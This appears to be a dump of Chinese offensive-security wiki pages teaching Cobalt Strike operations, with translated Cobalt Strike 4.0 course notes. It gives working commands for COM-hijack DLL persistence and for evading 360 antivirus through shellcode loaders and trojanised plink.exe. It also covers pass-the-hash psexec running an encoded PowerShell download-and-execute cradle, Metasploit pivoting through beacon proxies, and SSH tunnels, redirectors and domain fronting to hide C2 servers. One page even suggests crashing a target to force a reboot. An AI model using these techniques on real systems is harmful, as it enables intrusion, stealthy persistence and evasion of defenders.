才行,因为目标是 64 位系统,所以,我们此处在创建好监听器以后,直接生成一个 64 位的 dll payload 即可,具体如下 第二步,将 dll payload 丢到目标机器的任意隐蔽[务必要尽可能隐蔽]目录下,并创建相应劫持项,指明 dll payload 绝对路径 # reg add HKEY_CURRENT_USER\\Software\\Classes\\CLSID\\{42aedc87-2188-41fd-b9a3-0c966feabec1}\\InProcServer32 /v \"\" /t REG_SZ /d \"C:\\Windows\\Temp\\info.dll\" /f # reg add HKEY_CURRENT_USER\\Software\\Classes\\CLSID\\{42aedc87-2188-41fd-b9a3-0c966feabec1}\\InProcServer32 /v \"ThreadingModel\" /t REG_SZ /d \"Apartment\" /f # shutdown /r /t 0 第三步, 等待目标重启系统加载劫持项时便会触发执行我们的 dll payload,随后便会看到 beacon shell 被弹会,至于实战中如何尽可能快的让目标管理员去重启系统,比如,你可以可以试着想办法把它系统搞蓝屏 如下很明显,此时的 360 仍无任何反应,因为 CobaltStrike 3.8 生成的 dll payload,默认就是直接免杀 360 的,至于 3.8 之后的版本就更不用说了,免杀效果肯定只会更好,此处由于各种各样的原因,兵没有拿最新版的CobaltStrike 3.13 给大家做演示,其实,说白点,仅仅作为一个使用者来讲,它们在实际使用上的差别并不是特别大,新版本中无非就是新增了一些功能和特性,功能使用非常简单那,特性又都是体现在内部的,外表也看不太出来,所以在学习期间,大可不必过于纠结现在用的是什么版本,先起码能保证自己灵活用起来再说,以后再去考虑更多别的事情,也为时不晚 零组资料文库 all right reserved，powered by 0-sec.org未经授权禁止转载 2019-12-29 16:17:30 console.log(\"plugin-popup....\");document.onclick = function(e){ e.target.tagName === \"IMG\" && window.open(e.target.src,e.target.src)}img{cursor:pointer}"},"Tools/Cobalt Strike/29.html":{"url":"Tools/Cobalt Strike/29.html","title":"Cobalt Strike beacon 免杀上线 [ hanzoInjection ]","keywords":"","body":"Cobalt Strike beacon 免杀上线 [ hanzoInjection ] 模拟目标环境: AV-Server 192.168.3.58 装有最新版 360 套装 [ 卫士 + 杀毒 ] 2008r2 64 位系统 第一步,由于 hanzoInjection [ 也可以粗暴的把它理解为加载器 ] 是直接在内存中来注入执行 payload,首先,我们需要先准备好一个二进制数据格式的 payload,即\"raw\",如下 第二步,将 HanzoInjection.exe 和 cs.bin 同时丢到目标机器上执行 # HanzoInjection.exe -e cs.bin 稍等片刻,发现 beacon shell 被正常弹回,如下 360 此时仍然是无视的,可能过不太久 HanzoInjection.exe 肯定会被杀,这都再正常不过,不过加个自己的壳应该又能继续坚持用一段时间,此处多说一句,除了那种带签名的 payload,所有的免杀都只是暂时的,绝无一劳永逸的说法 零组资料文库 all right reserved，powered by 0-sec.org未经授权禁止转载 2019-12-29 16:23:09 console.log(\"plugin-popup....\");document.onclick = function(e){ e.target.tagName === \"IMG\" && window.open(e.target.src,e.target.src)}img{cursor:pointer}"},"Tools/Cobalt Strike/27.html":{"url":"Tools/Cobalt Strike/27.html","title":"Cobalt Strike beacon 免杀上线 [ 动态 shellcode 注入 ]","keywords":"","body":"Cobalt Strike beacon 免杀上线 [ 动态 shellcode 注入 ] 模拟目标环境: AV-Server 192.168.3.58 装有最新版 360 套装 [ 卫士 + 杀毒 ] 2008r2 64 位系统 第一步,所谓的动态 shellcode,简单理解就是将 shellcode 放入现有正常的 PE 文件中,当 PE 文件被执行起来时我们的 shellcode 也一并被触发执行,这种利用方式通常可用在内网感染,或者用来替换目标桌面上的一些小工具来做些临时的权限维持[实战中几乎不会这么干],ok,废话不多讲,我们来直接看下具体使用,首先,生成好二进制数据格式 payload 如下 准备正常的 pe 文件模板,此处暂以 plink.exe 为例进行演示,下载地址如下,注意,要选择 32 位的 https://www.chiark.greenend.org.uk/~sgtatham/putty/latest.html 第二步,利用 kali 自带的 wine 环境 [ 注意,也要用 32 位的 ],启动 shellter,选择\"A\"全自动注入模式,选择 PE 文件即\"plink.exe\",而后直接回车,注意它会把 PE 文件先自动备份一份到当前目录下的 Shellter_Backups 目录中 # wget https://the.earth.li/~sgtatham/putty/latest/w32/plink.exe # wget https://www.shellterproject.com/Downloads/Shellter/Latest/shellter.zip unzip shellter.zip wine shellter.exe 看到如下提示,直接回车即可 询问你是否要启用隐身模式,选择\"N \",因为在实战中,我们通常并不想让它有界面弹出来[虽然 plink.exe 本身就是个命令行程序],然后关键的地方来了,payload 选择\"C\"[即自定义 payload],然后指定 payload 路径,也就是我们刚才在上面生成的那个 shellter.bin 文件,接着再回车两次就不用再人为干预了 最后,被注入有 shellcode 的 plink.exe 会在当前目录下,想办法把它丢到目标机器上去正常执行就行了 因为 plink.exe 本身就是个命令行程序,所以直接在 cmd 下执行即可 # plink.exe -h 最终,看到 beacon shell 被正常弹回 零组资料文库 all right reserved，powered by 0-sec.org未经授权禁止转载 2019-12-29 16:13:28 console.log(\"plugin-popup....\");document.onclick = function(e){ e.target.tagName === \"IMG\" && window.open(e.target.src,e.target.src)}img{cursor:pointer}"},"Tools/Cobalt Strike/35.html":{"url":"Tools/Cobalt Strike/35.html","title":" CobaltStrike与Metasploit实战联动","keywords":"","body":"CobaltStrike与Metasploit实战联动 0x01 前言 关于 cobalstrike[以下全部简称\"cs\"] 和 Metasploit [以下全部简称 \"msf\"] 想必此处就不用再多废话了,总之,两者各有所长,比如,前者更适合做个稳控平台,后者则更擅长各类内网搜集和漏洞利用,而我们今天的目的就是为了把两者的优点尽可能的灵活结合起来进行运用,让各自相互依托,去做自己最擅长的事情,废话不多讲,来看实际操作 0x02 通过 beacon 内置的 socks 功能将本地 Msf 直接代入目标内网进行操作 首先,到已控目标内网机器的 beacon shell 下把 socks 起起来,[ 注: 今天此处所演示的,全部都是在 system 权限进行操作 ] beacon> getuid beacon> socks 1080 接着,点开 cs 菜单找到\"Proxy Pivots\"复制生成的 msf 代理链接 本地启动 msf,挂着上面生成的代理链接,即可直接对目标内网进行各种探测,实际效果如下 msf > setg Proxies socks4:138.128.218.66:1080 意思就是让本地的 msf 走上面 cs 的 socks 代理 msf > setg ReverseAllowProxy true 建双向通道 msf > use auxiliary/scanner/smb/smb_version 拿着 msf 中的各类探测模块对目标内网进行正常探测即可,比如,识别目标内网所有 windows 机器的详细系统版本,机器名和所在域 msf > set rhosts 172.17.180.0/24 指定 CIDR 格式的目标内网段,掩码可根据实际情况给的大一点,比如,0/20,0/16... msf > set threads 1 线程不易给的太大,可根据目标实际情况,控制在 10 以内 msf > run 利用这种方式可以极大的帮我们解决要自己往上传工具的不便及尴尬 0x03 尝试借助 CobaltStrike 的外部 tcp 监听器通过 ssh 隧道直接派生一个 meterpreter 的 shell 到本地 先在 cs 上创建一个 tcp 的外部监听器,回连端口设为 8080 接着,到本地机器把 msf 起起来,并创建如下监听器 msf > use exploit/multi/handler msf > set payload windows/meterpreter/reverse_tcp 注: 此处的协议格式务必要和上面 cs 外部监听器的协议对应,不然 meter 是无法正常回连的 msf > set lhost 192.168.3.137 msf > set lport 8080 msf > exploit 随后,回到自己的 vps 机器上编辑 sshd 配置,开启 ssh 转发功能,重启 ssh 服务,这是所有使用 ssh 隧道转发前的必备操作,后续不再啰嗦 # vi /etc/ssh/sshd_config AllowTcpForwarding yes GatewayPorts yes TCPKeepAlive yes PasswordAuthentication yes # systemctl restart sshd.service 再次回到自己本地的 linux 中并通过 ssh 隧道做好如下转发,意思就是通过 20.37.125.56 这台机器把来自外部的 8080 端口流量全部转到我本地 192.168.3.137 的 8080 端口上,而本地 192.168.3.137 的 8080端口上跑的又正好是 meter 的监听器,所以,最终才会造成 meterpreter 本地上线的效果 # ssh -C -f -N -g -R 0.0.0.0:8080:192.168.3.137:8080 root@20.37.125.56 -p 22 隧道建立之后,习惯性的到 vps 上去看一眼,刚才通过隧道监听的 8080 端口到底有没有起来,确实起起来了才说明隧道才是通的,另外,监听的端口不能和 vps 机器上的现有端口冲突,否则隧道是建不成功的 # netstat -tulnp | grep '8080' 最终,回到 cs 上选择目标内网指定机器的 beacon shell 点击\"Spawn\"派生,再选择刚在上面创建好的 tcp 的外部监听器,相应目标机器的 meterpreter 就会被直接弹到本地,如下,当然,你也可以批量选择进行操作 0x04 尝试利用 msf 的各类 exp 模块直接弹回一个 beacon shell 如下,先准备好一段 64 位的 shellcode,如下 而后,再对 Invoke-Shellcode.ps1 脚本中的 64 位 shellcode 进行替换 因为后续需要利用 powershell 远程加载执行 shellcode,所以为了方便执行,得事先把 powershell 加载语句编码整理下,如下 PS C:\\> $text = \"IEX (New-Object Net.WebClient).DownloadString('https://*/master/Invoke-Shellcode.ps1'); Invoke-demo -Force\" PS C:\\> $Bytes = [System.Text.Encoding]::Unicode.GetBytes($Text) PS C:\\> $EncodedText =[Convert]::ToBase64String($Bytes) PS C:\\> $EncodedText > bs64.txt 比如我们现在通过其它方式拿到了目标内网的某台 windows 机器的本地管理员密码 hash,就可以尝试利用 psexec_command 模块借助这种方式来直接反弹指定目标机器的 beacon shell,也算一种简单的横向方式 msf > use auxiliary/admin/smb/psexec_command msf > set rhost 192.168.3.11 msf > set smbuser administrator msf > set smbpass AAD3B435B51404EEAAD3B435B51404EE:CCEF208C6485269C20DB2CAD21734FE7 msf > set command powershell -exec bypass -encodedcommand SQBFAFgAIAAoAE4AZQB3AC0ATwBiAGoAZ* msf > set threads 1 msf > run 此处不用管它服务到底没有启动成功 最终,成功上线效果 0x05 灵活利用 ssh 隧道深度隐藏 C2 [ becon 本地上线 ,适合临时渗透用 ] 首先,创建一个普通的 http 反向 beacon 监听器,并用该监听器生成一个 64 位的 exe payload,随后再立即删除该监听器,具体如下 而后,回到自己本地的 linux 中,开始尝试和自己的 vps 建立 ssh 隧道,注意,此处用于建立隧道的这台 vps 和我们 cs 团队服务器所在的 vps 不是同一台机器[实际中有条件的情况下,也建议不要用同一台],转发和上面的那个 ssh 隧道差不太多,只不过这里是通过 20.37.125.56 这台机器把外部的 8080 端口都转到了本地 192.168.3.137 的 80 端口上,而这个 80 端口上跑的也就是我们下面创建的那个 inside 监听器,所以最终才会造成 beacon 的本地上线 # ssh -C -f -N -g -R 0.0.0.0:8080:192.168.3.137:80 root@20.37.125.56 -p 22 此处还是习惯性的到建立隧道的那台 vps 上,看看刚刚隧道监听的端口有没有起来 紧接着,再次回到自己本地的 linux 中,启动 cs 团队服务器和客户端 # ./teamserver 192.168.3.137 admin # ./cobaltstrike 继续创建 http 反向 beacon 监听器,注意,此处 inside 监听器的类型和上面 outside 监听器的类型务必要保持完全一致,不然,beacon 是弹不回来的 最后,把上面那个用 outside 监听器创建的 exe payload 丢到目标机器上去执行,实现的最终效果就是把来自公网的 beacon shell 通过 ssh 隧道直接弹到了本地,避免了直接把 cs 团队服务器暴露在公网 小结 小结: 以上每种方式其实都对应的有特定的渗透场景,至于实战中如何灵活配合利用,就要看弟兄们自己的实际需求了,另外多说一点,似乎很多人都在以讹传讹,觉得现在 msf 完全没有任何用武之地,其实,不然,当然啦,如果你就只想用它的各类 exp 和 payload 模块,对现如今的实战场景确实没啥卵用[如果你就不做任何处理直接默认用的话],也不用想了,因为各类传统监控和杀软早都已围追堵截,不过,我想说的是,你大可以不必用这些大家天天都死死盯着的东西,比如,某些内网探测模块一直都很好用呀,而且控制的好,动静儿也并不会非常大,重要的是,各个厂商也几乎都不怎么关注这些无关痛痒的辅助模块,关注更多的还是那堆致命的exp和 payload 的模块,所以,自己也经常强调,工具是死的,人是活的,关于 Cs 和 msf 联动配合利用方式还远不止这些,来日方长,我们后续再慢慢说,考虑到文章篇幅,有些地方说的并不是非常细致,弟兄们有任何问题,随时反馈就好,最后,祝好运 零组资料文库 all right reserved，powered by 0-sec.org未经授权禁止转载 2019-12-30 11:22:39 console.log(\"plugin-popup....\");document.onclick = function(e){ e.target.tagName === \"IMG\" && window.open(e.target.src,e.target.src)}img{cursor:pointer}"},"Tools/Cobalt Strike 4.0/序言.html":{"url":"Tools/Cobalt Strike 4.0/序言.html","title":"0. 序言","keywords":"","body":"序言 Cobalt Strike 4.0系列教程是按照官方发布的Cobalt Strike教程，进行的汉化翻译。因能力有限，可能会有一些内容翻译的不是很准确或是有错误。希望各位能多多包涵，并给我们反馈问题。 汉化组成员： flashine ian 零组资料文库 all right reserved，powered by 0-sec.org未经授权禁止转载 2020-01-23 12:01:36 console.log(\"plugin-popup....\");document.onclick = function(e){ e.target.tagName === \"IMG\" && window.open(e.target.src,e.target.src)}img{cursor:pointer}"},"Tools/Cobalt Strike 4.0/1.Opearations/1.Operations.html":{"url":"Tools/Cobalt Strike 4.0/1.Opearations/1.Operations.html","title":" 1.Opearations","keywords":"","body":"Operations 从红队角度看渗透难点 在一个红队的典型渗透过程中，一般来说按照顺序有四个目标，分别是：初始访问、代码执行、获取权限、后渗透。在上边流程图中，首先给目标用户发送一份钓鱼邮件，这时候需要考虑绕过防病毒、沙箱技术、反垃圾邮件网关等安全防护设备，这些设备往往会动态监测附件中的恶意程序，此外，SPF、DKIM、Dmarc更是让人感觉越来越头疼。当目标用户运行附件中的恶意程序时，终端防护中心可能就要动态的检测判断附件是否为恶意程序，比如附件是一个Word文档，用户打开以后运行了文档中包含的宏，该宏会产生将payload注入子进程的操作，这个时候，杀毒软件就会发现异常，并强制终止此操作。获取权限意味着要面对各种防火墙或者代理，甚至发现的代理指向了一个无效的域。即使穿透了代理，仍然需要想办法绕过各种流量安全监控，也许会暂时获得一个shell，但是安全监控会通过溯源找到子进程，并公布恶意程序形成一个有效的威胁情报广播，导致所有努力付之东流。 下图是一个攻击链： 课程设计 第一课到第三课，主要解决以上提到的问题，如何获取目标权限。第一课重点讨论如何规划自己的Teamserver，第二课主要通过配置监听器来了解Cobalt Strike的细节，第三课主要讲malleable c2。第四课和第五课主要从武器化的角度讨论初始访问和代码执行的问题，介绍如何根据目标情况选择合适的payload。第六课到第九课主要关注后渗透的内容。 Cobalt Strike介绍 Cobalt Strike是针对协作模型达到分布式操作Teamserver，主要用于团队作战，能让多个攻击者同时连接到Teamserver，共享攻击资源、目标信息以及session，提供了选择性和灵活性，通过课程将帮助你了解每一个选项的意义，以便可以正确的使用工具。 要达到获取权限的目的，首先我们要了解工具特性和作用，这样在使用的时候我们就可以灵活的使用或者优化；其次要评估和理解我们面对的防御；第三是找到最优的方式来解决问题，绕过防御。按照这样的思路，也可以让蓝队的流程和整体的安全得到优化。Cobalt Strike的任务是缩小渗透测试工具和高级软件之间的差距，目标是推动安全测试，通过这款软件，不仅可以达到日常练兵模拟，以攻击者思维来规划防护，攻防循环，同时可以培养专业安全人员。 Cobalt Strike特性 Beacon：Beacon是Cobalt Strike为高级攻击者建模的Payload。使用Beacon通过HTTP，HTTPS或DNS出口网络。而且Beacon非常灵活，支持异步和交互式通信。异步通信既低又慢。Beacon将通讯本地，下载任务，然后进入睡眠状态。交互式通信实时发生。 malleable c2：Cobalt Strike最有用的功能之一就是可以修改Beacon payload的行为。通过修改框架内的各种默认值，操作者可以修改Beacon的内存占用，更改其检入的频率，甚至可以修改 Beacon的网络流量。所有这些功能都是由Malleable C2配置文件控制，该配置文件在启动团队服务器时选择。 Aggressor Script：加载各种脚本，对客户端可修改可扩展，可以响应事件，横向移动自动化，更改产品生成可执行文件和dll的方式，甚至可以使用和生成powershell脚本。 启动Cobalt Strike 在Cobalt Strike的文件夹下包含了一个名为Teamserver的脚本来启动服务。./ teamserver [profile] 通过执行文件夹下的cobaltstrike脚本启动客户端，./cobaltstrike 客户端连接多个Teamserver 连接多个Teamserver的好处除了便于操作外，更重要的是可以在多个Teamserver之间传递权限，比如使用临时服务器做横向移动，获取到了其他权限，但是第一台服务器存在比较高的安全风险，这样就可以有多个Teamserver来专门用于后渗透，即使第一台机器异常，不影响权限维持。具体连接多个Teamserver的方法如下图： Teamserver模型 临时服务器发起对主机攻击以及shell反弹提权，完成权限维持 长期服务器低频数据通讯，以持续权限根据实际需求传递访问权限用于后渗透 后渗透服务器 Teamserver角色 在多目标网络的情况下，Teamserver建议分为目标角色和管理角色。 目标角色负责特定网络的目标，突破、后渗透、横向移动、维护当前Teamserver； 管理角色负责管理所有的网络访问权限，突破并接受目标角色的访问，如果有目标角色被删除权限或者需要其他访问权限，管理角色就需要向目标角色提供许可，其次管理角色需要维护全局Teamserver。 团队角色 建议将团队按照角色进行分工 一个团队致力于获取访问权限，目的是扩大立足点，这个团队需要考虑武器化、初始访问和横向移动； 专注于目标的后渗透组，他们通过文件系统、收集键盘记录、屏幕截图，获得拿下目标的机会； 本地访问管理角色，用户管理和保护shell，根据需要搭建Teamserver，并交接session。 日志 Cobalt Strike可以通过时间或者IP排序，所有的操作和payload都会被保存到日志中，Cobalt Strike的/logs文件夹下保存了相关日志。 报告 Cobalt Strike可以将多个Teamserver的数据同步到同一个时间合并到一个日志模型中，这样就可以在不同的Teamserver上得到一个准确的时间排序。 零组资料文库 all right reserved，powered by 0-sec.org未经授权禁止转载 2020-02-01 20:58:36 console.log(\"plugin-popup....\");document.onclick = function(e){ e.target.tagName === \"IMG\" && window.open(e.target.src,e.target.src)}img{cursor:pointer}"},"Tools/Cobalt Strike 4.0/2.Infrastructure/2.Infrastructure.html":{"url":"Tools/Cobalt Strike 4.0/2.Infrastructure/2.Infrastructure.html","title":" 2.Infrastructure","keywords":"","body":"Infrastructure（基础建设） 0x01 listener management(监听器管理) 一个listener配置一个Cobalt strike payload，也只匹配一个payload控制器。在Cobal Strike中有如下三种监听器： egress：入口监听器 peer-to-peer：通过父级payload使用 alias：调用第三方的payload 处理器 添加listener时确保每一个都其对应的名称，名称很重要，因为这样便于团队的其他成员去使用它。 以下列出了你可以创建的监听器类型： 0x02 stager stager是一个用来和C2建立连接并下载payload，然后执行payload的轻量级程序。 有时候目标环境限制了执行程序的大小，所以经常会制作比较轻量级的程序来执行payload，常见的有Powershell一句话。 stageless直接省略了下载payload的步骤，所以一般生成的stageless程序都是exe或者dll文件，相对stager来说要大得多，而且包含了一些特征。 在CS4中，stagers不再作为最流行的工具来使用，但是一些由用户驱动的攻击仍然使用stager。stager将不再对其控制端进行权限认证，因此stager将变得不安全。stager也变得脆弱了，如果它碰到了一些没有预期的情况时，可能stager会崩溃。这些stagers之所以还保留着是因为它们是为Metasploit框架服务的。stager的代码内容也是很容易被发现的，而且任何一种内存扫描器也应该能够发现它们。CS没有能力去在内存中清除这些特征或者是给他们添加混淆。 0x03 stager工作流程举例 通过打开一个带有宏的word文档来创建子进程，然后通过打开文档执行宏代码执行stager程序，接着stager将通过HTTP或HTTPS协议请求C2控制器，请求的URI上会带有一个校验值，在校验值通过检查后，服务器将会将payload传回，然后stager将开始执行该payload。 如果你的stager是请求到Metasploit Framework Handler上，那么你将获得一个不够健壮（immature）的payload。如果你是请求到Coballt Strike的web服务上，那么你将获得一个beacon payload。 Metasploit Framework作为控制器的话，payload需要配置为windows meterpreter reverse http 或者 reverse https。Metasploit的攻击流程也是一样的，发送GET请求，然后下载Cobalt strike beacon payload，所以Cobal Strike允许你使用一个Metasploit Framework生成的exp来传输Cobal Strike beacon。 另外，Cobal Strike还可以派生shell给Metasploit（前提是有个beacon shell）。 msf > use exploit/multi/handler msf exploit(handler) > set payload windows/meterpreter/reverse_tcp payload => windows/meterpreter/reverse_tcp msf exploit(handler) > set lhost 192.168.1.100 lhost => 192.168.1.100 msf exploit(handler) > set lport 5555 lport => 5555 msf exploit(handler) > exploit Metasploit 也可以派生shell给Cobal Strike（前提有一个meterpreter） msf exploit(handler) > use exploit/windows/local/payload_inject 　　msf exploit(payload_inject) > set PAYLOAD windows/meterpreter/reverse_http 　　msf exploit(payload_inject) > set DisablePayloadHandler true 　　msf exploit(payload_inject) > set LHOST 192.168.229.143 　　msf exploit(payload_inject) > set LPORT 1212 　　msf exploit(payload_inject) > set SESSION 1 　　msf exploit(payload_inject) > exploit 这样就可以从Cobal Strike传递一个session给Metasploit，也可以传递一个session从一个Cobal Strike实例给另外一个没有连接的Cobal Strike实例。 Cobal Strike是用foreign listener来实现配置payload handler参数的。 0x04 HTTP Beacon介绍 1. 配置HTTP Beacon: 可以设置连接到多个主机（域名、IPv4、IPv6都可以，IPv6需要标准格式[::]） 配置代理(可选项)： 配置完毕后在Attacks - Web Drive-by - Scripted Web Delivery菜单配置web服务：点击launch后会生成powershell一句话，复制到目标主机运行这个powershell脚本：Cobal Strike将会与http beacon建立连接： 2. HTTP Beacon传输过程 场景举例：一个C2控制器、一个运行了http beacon的目标主机 http beacon 向C2控制器发送GET请求，判断有无内容返回： (1) 若C2无内容返回，那么beacon将会进行睡眠状态，之后beacon将会在一开始配置好的时间之后重新请求C2。(2) 当C2返回了请求内容时，内容将会是一些被加密过的需要执行的payload。 当http beacon执行完payload之后需要将结果回传给Cobal Strike时，它将使用POST请求，请求内容为payload执行的结果被加密后的密文。如果payload执行后没有输出结果，那么将不会发送POST请求。 HTTPS Beacon的用法和HTTP一样，只是HTTPS使用了SSL证书而已 0x05 Redirector(重定向器) 1. 介绍redirector 一般redirector设置在你的Cobal Strike实例和你的目标网络之间，redirector会将流量转发至你的Cobal Strike实例。redirector存在的意义是为了模糊你的Cobal Strike的Team server的位置，这相当于为你的Cobal Strike team server设置了多个IP地址。 你可以使用iptables、socat或者其他工具去转发流量到你的Cobal Strike Team server。命令如下： socat TCP4-LISTEN:80,fork TCP4:[team server]:80 你也可以启用一个Apache或者Nginx服务作为你的Cobal Strike的反向代理来替代redirector的作用。 你还可以使用CDN，比如Amazon的Cloudfront来作为一个redirector转发https流量到你的Cobal Strike。 2. 使用socat实现一个redirector 环境说明： c2：secure.losenolove.com redirector：54.158.156.250, 34.207.207.199.101# 在54.158.156.250上执行如下命令 # 先安装socat sudo apt-get update && apt-get install socat #socat转发 sudo socat TCP4-LISTEN:80,fork TCP4:secure.losenolove.com:80 直接访问http://54.158.156.250/bar ，然后在Cobal Strike的web log上就可以看到访问记录了 Cobal Strike配置redirectors：在HTTP HOSTS里添加 3. 使用CDN实现一个redirector CND Redirector要求如下 网站使用SSL证书 配置允许使用HTTP POST和GET方法 避免出现问题，需要在C2配置文件里设置允许使用HTTP GET方法下载任务和回传数据给Cobal Strike 禁用所有缓存选项（避免数据不转发到服务器） 清楚地知道你传输的内容 注：由于某些CDN（比如Cloudfront会修改cookie）在传输过程中可能会对HTTP header头部的内容进行修改。这本来没什么影响除非你的C2设置了通过HTTP headr的Cookie字段来传输数据给Cobal Strike。所以对于CDN转发的内容你得清楚地知道。 使用CDN Redirector有一个比较好的东西需要了解，那就是Domain Fronting(域前置)，可以参考深信服社区的一篇文章Domain fronting域名前置网络攻击技术 实际效果是beacon向一个信誉度比较高的网站发送请求时，设置HTTP header里的Host为我们在CDN配置完毕后获得的一个CDN的二级域名（比如xxx.cloudfront.net），然后这个HTTP请求就会转发到CDN的地址，再转发到C2的地址。 如果目标主机使用了代理服务器向外界发送HTTP请求，那么在使用Domain Fronting时，代理服务器可能会检测到请求的URI和Host中的内容不一致，然后就会自动将Host的内容替换为URI中的域名，接着该请求就会发送给那个信誉度比较高的网站。然而如果你使用了HTTPS，一般就不会出现这个问题。（有些企业会对HTTPS流量进行监测，如果被监测发现了，Host头还是有可能会被纠正） 然而现在有些CDN自己开始对SSL流量进行监测去避免Domain Fronting。但是使用SSL协议传输，严格地说是使用TLS协议传输的数据包中HTTP协议的外层有一层SNI（Server Name Indication），SNI告诉了CDN这个HTTPS请求应该发给谁（实际SNI的值与Host的内容一致），然后CDN监测到了就会纠正这个HTTPS请求 # SNI举例： Extension: server_name Type: server_name (0x0000) Length: 19 Server Name Indication extension Server Name list length: 17 Server Name Type: host_name (0) Server Name length: 14 Server Name: www.github.com 现在如果你想做Domain Fronting，那么可以直接在添加Listener的时候设置HTTP Host Header（可以参考0x04添加Listener那张图）。 0x06 Server Consolidation(巩固服务器) 在Cobal Strike4中，你可以定义多个egress listener（相当于内网入口） HTTP Port(Bind)用于以下场景：Redirector使用80端口，HTTP C2则使用另外一个端口（即当前设置项的内容），实际流量是从Redirector的80端口进入，然后再转发到你设置的这个listener绑定的端口 现在每一个listener都有一个可修改的的配置文件 现在可以配置多个TCP和SMB listener了 0x07 DNS Beacon 1. 介绍DNS Beacon DNS beacon是通过DNS解析来访问Cobal Strike Team Server的，所以运行Cobal Strike Team Server的服务器需要关闭本地的，运行Beacon的主机会将beacon的标识符伪装成一个子域名。DNS Beacon举例： DNS Beacon向本地DNS缓存查询是否有域名1234.profiles.losenolove.com的解析记录 本地缓存未查询到时，本地DNS服务器将会向根服务器请求解析该域名，根域名服务器发现域名是.com的域名，便指示本地DNS服务器去.com域名服务器查询 .com服务器收到解析请求后将解析请求转发给网站注册的域名服务器（此处是godaddy） 网站注册的域名服务器再将解析请求转发给losenolove.com的网站服务器（Cobal Strike Team Server） Cobal Strike Team Server收到解析请求后检查是否存在与该域名相关的任务在运行，如果有，通常情况下Team Server会将payload放置到响应内容中返回给本地DNS服务器，本地DNS服务器再转给DNS Beacon； DNS Beacon执行完相关命令后，将数据加密后再放置到一个子域名中（类似1234.profiles.losenolove.com中的1234），然后再对该子域名发送DNS解析请求 这里相比CS3而言，CS4的DNS Beacon可以设置Redirector。 DNS Stager host可以用于设置Redirector，Port(Bind)可以用于redirector的其他端口(默认为53端口)，而Cobal Strike Team Server则使用53端口 鉴于HTTP可能存在无法访问的风险，新的DNS Beacon将不再使用HTTP通道，即不再使用HTTP下载Payload，默认将使用dns-txt通道通过DNS txt记录解析传输至Cobal Strike Team Server，然后通过DNS A请求返回payload。在Beacon的操作终端上可以切换通道（channel）。但是DNS请求内容和返回内容限制了长度，所以dns-txt会最大化使用域名长度（根据配置设定）,dns-txt也是相对而言最好的。而dns和dns6则会对这种域名进行截断，因为在某些网络里，非常长的域名将会被自动拦截。 2. 实现一个DNS Beacon 准备工作： 申请一个域名并创建一个A记录给你的Cobal Strike Team Server（即域名解析为IP） 创建一个NS记录给你申请的域名（解析子域名） 实例举例：　　Team Server域名：malwarec2.losenolove.com　　创建一个DNS Beacon listener:linux下可使用dig +trace [域名]查看域名的解析过程在目标主机执行powershell一句话执行DNS Beacon，Team Server结果如下：界面上没有主机信息显示是因为没有发送测试数据，可以直接右键点击Interact进行交互后获得主机信息。可以使用sleep 5修改心跳时间（默认1min）DNS通道是一个被限制数据大小的通道，如果需要传输大文件，那么可能需要通过发起多次DNS解析请求来传输，比如执行截图命令、执行Mimikatz，这将消耗很长时间。 0x08 SMB Beacon 1. 介绍SMB Beacon SMB Beacon使用命名管道通过父级Beacon进行通讯，当两个Beacon连接后，子Beacon从父Beacon获取到任务并发送。因为连接的Beacons使用Windows命名管道进行通信，此流量封装在SMB协议中通过445端口进行传输。 2. 创建SMB Beacon Listener 3. 连接和断连SMB Beacon 在Beacon控制台上输入link [host] [pipe name]命令进行连接Beacon操作，输入unlink [host] [pid]命令进行断连Beacon操作。如果你断开了当前Beacon的连接，那么它与它的子级Beacon也会断开连接。而这个子级Beacon将会进入到一个等待父级Beacon连接的状态。当你连接到一个Beacon时，可能会出现错误代码提示，上图举例说明了几个。 错误代码 名称 描述 2 File Not Found 没有可以连接的Beacon 5 Access is Denied 你没有权限连接到这个Beacon/这个命名管道，如果是在远程主机上，那么你的access token可能无效或者没有权限访问，也可能是该管道被系统锁定了 53 Bad Netpath 说明Beacon与目标服务器并没有建立通信关系，只能说明目标服务器没有任何响应给你 3. 创建一个SMB实例 接着上面的DNS Beacon执行如下操作：创建一个Cobal Strike Listener：执行权限提升：payload将会通过DNS Beacon传输并执行。 如果想要图形化地查看Beacon的关系，可以点击Cobal Strike - Visualization > Pivot Graph进行查看 0x09 TCP Beacon 1. 介绍TCP Beacon TCP Beacon和SMB Beacon很像，它也可以被一个父级Beacon所控制，父级Beacon可以是TCP Beacon，也可以是SMB Beacon。这里的Bind to localhost only用于你需要使用TCP Beacon进行主机渗透的权限提升或者横向渗透的情况。 2. 连接和断开Beacon # 连接到一个TCP Beacon connect [host] [port] # 断连一个TCP Beacon，断连后将进入一个等待连接的状态 unlink [host] [pid] 3. 实例演示TCP Beacon 基于之前的DNS Beacon 创建Listener： DNS Beacon执行Spawn as 手动设置payload也是通过DNS Beacon传输的橙色的线代表连接的是SMB Beacon，蓝绿色的线则代表TCP Beacon 0xA External C2 1. 介绍External C2 ExternalC2是由Cobalt Strike提出的一套规范/框架，它允许用户根据需要对框架提供的默认HTTP(S)/DNS/SMB C2 通信通道进行扩展。 第三方控制器:负责创建与Cobalt Strike TeamServer的连接，并使用自定义C2通道与目标主机上的第三方客户端进行通信。 第三方客户端:负责使用自定义的C2通道与第三方控制器进行通信，并将命令中转到SMB Beacon。 SMB Beacon:在受害者机器上运行的标准Beacon。 深入学习可参考 深入探索Cobalt Strike的ExternalC2框架 external C2官方帮助文档2. 实例演示 此处使用官方示例程序进行演示，具体程序编译过程此处省略。创建监听器：windows执行编译好的程序连接Cobalt Strike Team Server：example.exe 54.80.166.26 2222Cobalt Strike Team Server收到Session： 零组资料文库 all right reserved，powered by 0-sec.org未经授权禁止转载 2020-01-19 22:50:55 console.log(\"plugin-popup....\");document.onclick = function(e){ e.target.tagName === \"IMG\" && window.open(e.target.src,e.target.src)}img{cursor:pointer}"},"Tools/Cobalt Strike 4.0/3. C2/3. C2.html":{"url":"Tools/Cobalt Strike 4.0/3. C2/3. C2.html","title":" 3. C2","keywords":"","body":"C2 运行 C2 代理 ./teamserver [ip address] [password] [profile] C2代理的组成部分 Options Blocks Extraneous Indicators Transforms C2与运转方式 http-get：负责储存加密的信息，同时服务器也会发送数据 Beacon，因为可以使用http-get进行服务器输出数据修改。 http-post：控制如何将Beacon发送到其他团队服务器。 http-stager：用于转换编码。 http-config：自定义配置http响应数据。 http-certificate：配置SSL证书。 C2 更改代理设置 可以通过新建监听器的时候，在Profile里面进行自定义配置。 C2 自定义配置 ./c2lint [profile] pico etumbot.profile 